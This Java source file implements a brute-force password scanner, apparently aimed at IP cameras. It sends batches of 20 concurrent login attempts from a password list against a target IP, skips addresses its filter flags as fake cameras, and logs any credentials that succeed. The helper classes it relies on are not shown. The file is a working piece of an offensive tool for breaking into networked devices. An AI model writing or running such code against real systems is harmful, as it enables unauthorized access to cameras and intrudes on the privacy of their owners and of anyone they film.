package scanner.brute;

import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;

import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.*;

@Slf4j
public class BruteForceScanner {

    private final ExecutorService executorService = Executors.newFixedThreadPool(20);
    volatile private AuthStateStore auth;

    @SneakyThrows
    public void brute(String ip, String[] passwords) {
        auth = new AuthStateStore();

        if (IpBruteFilter.excludeFakeCamera(ip))
            return;

        HashSet<BruteForceExecutor> requests = new HashSet<>();
        for (int i = 0; i < passwords.length; i++) {
            if (auth.isAuth() && requests.size() > 1) {
                auth.setCredentials(Optional.empty());
                auth.setState(AuthState.NOT_REQUIRED);
                break;
            }

            requests.add(new BruteForceExecutor(ip, passwords[i], auth));
            if (requests.size() == 20 || i == passwords.length - 1) {
                List<Future<Void>> futures = executorService.invokeAll(requests, 2L, TimeUnit.SECONDS);
                for (Future<Void> future : futures) {
                    try {
                        future.get();
                    } catch (CancellationException | ExecutionException | InterruptedException ce) {
                        auth.setState(AuthState.NOT_AVAILABLE);
                        future.cancel(true);
                    }
                }
                requests.clear();
            }
        }
        switch (auth.getState()) {
            case AUTH:
            case NOT_REQUIRED:  log.info("{} => {}", ip, auth.getCredentials().orElse("Auth not required")); break;
            case NOT_AVAILABLE: // maybe it will be deleted as "bad cameras"
            case NOT_AUTH:
            default: break;
        }
    }

}